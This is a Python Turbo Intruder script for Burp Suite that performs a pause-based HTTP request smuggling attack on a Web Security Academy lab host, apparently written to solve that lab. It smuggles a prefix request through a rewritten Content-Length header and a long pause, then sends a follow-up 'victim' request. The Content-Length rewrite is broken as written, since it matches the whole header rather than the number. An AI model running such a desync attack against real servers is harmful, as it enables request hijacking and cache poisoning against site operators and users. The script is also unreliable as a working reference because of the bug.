from javax.swing import JOptionPane,JPanel

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    prefix = """GET /resources/labheader/js/labHeader.js HTTP/1.1
x: x"""

    if '\r' not in prefix:
        prefix = prefix.replace('\n', '\r\n')
        
    victim = """GET /robots.txt HTTP/1.1
Host: 0a0a008304c2b2fcc072395a00ed00fd.web-security-academy.net

"""

    if '\r' not in victim:
        victim = victim.replace('\n', '\r\n')

    attacker = target.req + prefix

    cl = re.search('Content-Length: ([\d]+)', attacker)
    if cl is None:
        JOptionPane.showMessageDialog(JPanel(),"Need Content-Length header!!!!!","Warning", JOptionPane.ERROR_MESSAGE)
    else:
        content_length = cl.group(0)
        attacker = attacker.replace('Content-Length: '+content_length, 'Content-Length: '+str(len(prefix)))
        engine.queue(attacker, pauseMarker=['\r\n\r\n'], pauseTime=61000)
        engine.queue(victim)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    table.add(req)


